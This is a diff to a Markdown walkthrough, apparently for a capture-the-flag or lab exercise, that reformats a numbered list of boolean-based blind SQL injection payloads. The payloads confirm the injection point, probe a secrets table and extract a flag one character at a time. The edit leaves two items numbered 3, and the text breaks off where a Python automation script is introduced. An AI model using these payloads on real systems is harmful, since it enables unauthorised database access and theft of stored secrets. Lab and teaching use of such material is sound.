@@ -116,40 +116,39 @@ the data you want, and read the answer from whether the page says
 **Payloads, in order:**
 
 1. Confirm a valid user exists:
-
+```
 ?username=alice
-
-
-2. Confirm the injection point — inject a true condition:
-
+```
+3. Confirm the injection point — inject a true condition:
+```
 ?username=alice' AND '1'='1'--
-
+```
    Should return "exists" (true condition, query still valid).
 
 3. Inject a false condition to confirm boolean control:
-
+```
 ?username=alice' AND '1'='2'--
-
+```
    Should return "not found" (false condition overrides the match).
 
 4. Confirm you can reach the secrets table:
-
+```
 ?username=alice' AND (SELECT COUNT(*) FROM secrets)>0 AND '1'='1'--
-
+```
    Returns "exists" if the secrets table has at least one row.
 
 5. Extract the flag length first (helps scope your loop):
-
+```
 ?username=alice' AND (SELECT LENGTH(secret_value) FROM secrets)=34 AND '1'='1'--
-
+```
    Increment the number until it returns "exists" — that's the flag length.
 
 6. Extract flag character by character:
-
+```
 ?username=alice' AND SUBSTR((SELECT secret_value FROM secrets),1,1)='F' AND '1'='1'--
 ?username=alice' AND SUBSTR((SELECT secret_value FROM secrets),2,1)='L' AND '1'='1'--
 ?username=alice' AND SUBSTR((SELECT secret_value FROM secrets),3,1)='A' AND '1'='1'--
-
+```
    Keep incrementing the position index until you've extracted all characters.
 
 7. Automate it with a Python script (recommended — 34 characters
